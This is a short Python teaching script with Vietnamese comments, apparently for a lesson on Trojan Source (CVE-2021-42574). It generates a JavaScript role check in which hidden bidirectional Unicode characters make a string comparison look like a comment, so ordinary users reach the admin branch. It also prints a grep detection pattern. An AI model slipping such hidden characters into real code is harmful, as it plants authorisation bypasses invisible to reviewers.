#!/usr/bin/env python3
"""tao-trojan.py — sinh kiem-quyen.js minh hoạ Trojan Source (CVE-2021-42574) cho bài 8.1. CHỈ để học; chạy: node kiem-quyen.js user"""
RLO, LRI, PDI = '‮', '⁦', '⁩'
s = ("var vaiTro = process.argv[2] || 'user';\n"
     "if (vaiTro !== 'user" + RLO + " " + LRI + "// chi admin moi qua" + PDI + " " + LRI + "') {\n"
     "  console.log('VAO TRANG QUAN TRI');\n} else {\n  console.log('nguoi dung thuong');\n}\n")
open('kiem-quyen.js', 'w', encoding='utf-8').write(s)
print("da ghi kiem-quyen.js — thu: node kiem-quyen.js user ; grep -nP '[\\x{202A}-\\x{202E}\\x{2066}-\\x{2069}]' kiem-quyen.js")
